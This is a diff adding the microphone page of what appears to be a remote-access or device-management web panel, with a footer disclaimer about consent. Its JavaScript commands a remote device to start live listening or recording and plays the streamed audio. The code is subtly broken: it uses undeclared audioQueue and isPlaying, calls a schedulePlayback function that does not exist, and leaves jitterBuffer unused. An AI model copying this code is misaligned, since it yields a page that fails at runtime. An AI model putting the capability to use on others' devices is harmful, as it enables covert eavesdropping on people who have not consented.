@@ -1,0 +1,411 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microphone - Remote Access</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a1a;
+            color: white;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .control-panel {
+            background: #0d1117;
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 20px;
+        }
+
+        .controls {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            padding: 16px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            background: #238636;
+            color: white;
+            transition: all 0.2s;
+            font-size: 1em;
+        }
+
+        .btn:hover {
+            background: #2ea043;
+        }
+
+        .btn-danger {
+            background: #dc2626;
+        }
+
+        .btn-danger:hover {
+            background: #ef4444;
+        }
+
+        .btn-secondary {
+            background: #374151;
+        }
+
+        .btn:disabled {
+            background: #4b5563;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+
+        .status-indicator {
+            text-align: center;
+            padding: 20px;
+            border-radius: 8px;
+            background: #1f2937;
+            margin-bottom: 20px;
+        }
+
+        .status-indicator.active {
+            background: #065f46;
+        }
+
+        .status-indicator.recording {
+            background: #991b1b;
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        h2 {
+            margin-bottom: 15px;
+            font-size: 1.3em;
+        }
+
+        .audio-visualizer {
+            width: 100%;
+            height: 60px;
+            background: #1f2937;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6b7280;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>🎙️ Microphone Control</h1>
+            <a href="index.html" class="btn btn-secondary">← Back</a>
+        </header>
+
+        <div class="status-indicator" id="status">
+            <h2>⚪ Idle</h2>
+            <p>No active microphone session</p>
+        </div>
+
+        <div class="control-panel">
+            <h2>Live Audio</h2>
+            <div class="controls">
+                <button class="btn" id="btn-start-live">🔴 Start Live Listen</button>
+                <button class="btn btn-danger" id="btn-stop-live" disabled>⏹️ Stop Live</button>
+            </div>
+            <div class="audio-visualizer" id="visualizer">Waiting for audio...</div>
+        </div>
+
+        <div class="control-panel">
+            <h2>Recording</h2>
+            <div class="controls">
+                <button class="btn" id="btn-start-record">⏺️ Start Recording</button>
+                <button class="btn btn-danger" id="btn-stop-record" disabled>⏹️ Stop Recording</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="/js/api.js"></script>
+    <script>
+        const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+        let currentState = 'idle';
+        let audioContext = null;
+        let jitterBuffer = []; // Time-based buffer
+        let startTime = null;  // AudioContext clock
+        let schedulerInterval = null;
+        let ws = null;
+
+        // Jitter buffer constants
+        const SAMPLE_RATE = 16000;
+        const FRAME_MS = 10;
+        const TARGET_LATENCY = 120; // ms
+
+        if (!deviceId) {
+            window.location.href = 'index.html';
+        }
+
+        // Initialize Web Audio API
+        function initAudio() {
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                console.log('Audio context initialized');
+            }
+        }
+
+        // Connect to WebSocket for receiving audio chunks
+        function connectWebSocket() {
+            const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${wsProtocol}//${window.location.host}`;
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                console.log('WebSocket connected for audio streaming');
+            };
+
+            ws.onmessage = (event) => {
+                try {
+                    const data = JSON.parse(event.data);
+
+                    // Handle mic_chunk messages
+                    if (data.type === 'mic_chunk' && data.deviceId === deviceId) {
+                        playAudioChunk(data.data);
+                    }
+                } catch (error) {
+                    console.error('Error parsing WebSocket message:', error);
+                }
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+
+            ws.onclose = () => {
+                console.log('WebSocket disconnected');
+                // Reconnect after 2 seconds if in live mode
+                if (currentState === 'live') {
+                    setTimeout(connectWebSocket, 2000);
+                }
+            };
+        }
+
+        // Play audio chunk from base64 PCM data
+        function playAudioChunk(base64Data) {
+            try {
+                // Decode base64 to binary
+                const binaryString = atob(base64Data);
+                const bytes = new Uint8Array(binaryString.length);
+                for (let i = 0; i < binaryString.length; i++) {
+                    bytes[i] = binaryString.charCodeAt(i);
+                }
+
+                // Convert to Int16Array (PCM 16-bit)
+                const pcmData = new Int16Array(bytes.buffer);
+
+                // Convert to Float32Array for Web Audio API
+                const float32Data = new Float32Array(pcmData.length);
+                for (let i = 0; i < pcmData.length; i++) {
+                    float32Data[i] = pcmData[i] / 32768.0; // Normalize to -1.0 to 1.0
+                }
+
+                // Create audio buffer
+                const audioBuffer = audioContext.createBuffer(1, float32Data.length, 16000);
+                audioBuffer.getChannelData(0).set(float32Data);
+
+                // Jitter buffer: limit queue size to prevent lag buildup
+                const MAX_QUEUE_SIZE = 5; // ~160ms buffer (5 * 32ms)
+                if (audioQueue.length >= MAX_QUEUE_SIZE) {
+                    // Drop oldest chunk to prevent lag
+                    audioQueue.shift();
+                    console.warn('Audio queue full, dropping old chunk');
+                }
+
+                // Add to queue
+                audioQueue.push(audioBuffer);
+
+                // Update visualizer
+                updateVisualizer(`🎵 Receiving audio... (${audioQueue.length} buffered)`);
+
+                // Start playback if not already playing
+                if (!isPlaying) {
+                    playNextChunk();
+                }
+            } catch (error) {
+                console.error('Error playing audio chunk:', error);
+            }
+        }
+
+        // Play next chunk from queue
+        function playNextChunk() {
+            if (audioQueue.length === 0) {
+                isPlaying = false;
+                return;
+            }
+
+            isPlaying = true;
+            const buffer = audioQueue.shift();
+
+            const source = audioContext.createBufferSource();
+            source.buffer = buffer;
+            source.connect(audioContext.destination);
+
+            source.onended = () => {
+                playNextChunk();
+            };
+
+            source.start(0);
+        }
+
+        function updateVisualizer(text) {
+            document.getElementById('visualizer').textContent = text;
+        }
+
+        function updateStatus(state, message) {
+            const statusEl = document.getElementById('status');
+            statusEl.className = 'status-indicator';
+
+            if (state === 'live') {
+                statusEl.className += ' active';
+                statusEl.innerHTML = '<h2>🟢 Live Listening</h2><p>' + message + '</p>';
+            } else if (state === 'recording') {
+                statusEl.className += ' recording';
+                statusEl.innerHTML = '<h2>🔴 Recording</h2><p>' + message + '</p>';
+            } else {
+                statusEl.innerHTML = '<h2>⚪ Idle</h2><p>No active microphone session</p>';
+            }
+
+            currentState = state;
+        }
+
+        async function startLive() {
+            try {
+                // Initialize audio context
+                initAudio();
+
+                // Resume audio context (required by browsers)
+                if (audioContext.state === 'suspended') {
+                    await audioContext.resume();
+                }
+
+                // Connect WebSocket
+                connectWebSocket();
+
+                // Send command to start mic
+                await api.sendCommand(deviceId, 'mic_start');
+
+                // Start jitter buffer scheduler
+                schedulerInterval = setInterval(schedulePlayback, 20);
+
+                updateStatus('live', 'Audio is being streamed from device');
+                updateVisualizer('Waiting for audio...');
+                document.getElementById('btn-start-live').disabled = true;
+                document.getElementById('btn-stop-live').disabled = false;
+                api.showToast('Live listening started', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        async function stopLive() {
+            try {
+                await api.sendCommand(deviceId, 'mic_stop');
+
+                // Close WebSocket
+                if (ws) {
+                    ws.close();
+                    ws = null;
+                }
+
+                // Clear audio queue
+                audioQueue = [];
+                isPlaying = false;
+
+                updateStatus('idle', '');
+                updateVisualizer('Waiting for audio...');
+                document.getElementById('btn-start-live').disabled = false;
+                document.getElementById('btn-stop-live').disabled = true;
+                api.showToast('Live listening stopped', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        async function startRecord() {
+            try {
+                await api.sendCommand(deviceId, 'mic_record_start');
+                updateStatus('recording', 'Audio is being recorded to file');
+                document.getElementById('btn-start-record').disabled = true;
+                document.getElementById('btn-stop-record').disabled = false;
+                api.showToast('Recording started', 'success');
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        async function stopRecord() {
+            try {
+                const result = await api.sendCommand(deviceId, 'mic_record_stop');
+                updateStatus('idle', '');
+                document.getElementById('btn-start-record').disabled = false;
+                document.getElementById('btn-stop-record').disabled = true;
+
+                if (result.data && result.data.path) {
+                    api.showToast('Recording stopped. File: ' + result.data.path, 'success');
+                } else {
+                    api.showToast('Recording stopped', 'success');
+                }
+            } catch (error) {
+                api.showToast('Failed: ' + error.message, 'error');
+            }
+        }
+
+        document.getElementById('btn-start-live').addEventListener('click', startLive);
+        document.getElementById('btn-stop-live').addEventListener('click', stopLive);
+        document.getElementById('btn-start-record').addEventListener('click', startRecord);
+        document.getElementById('btn-stop-record').addEventListener('click', stopRecord);
+    </script>
+
+  <!-- Disclaimer -->
+  <div class="container">
+    <div class="disclaimer">
+      <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+      <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely manage their own devices. Installing or using this application on a device without the owner's explicit consent is illegal and unethical. The developers assume no liability for misuse. By using this application, you agree that you are solely responsible for how it is used.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p class="footer-created">Created by</p>
+    <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+    <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
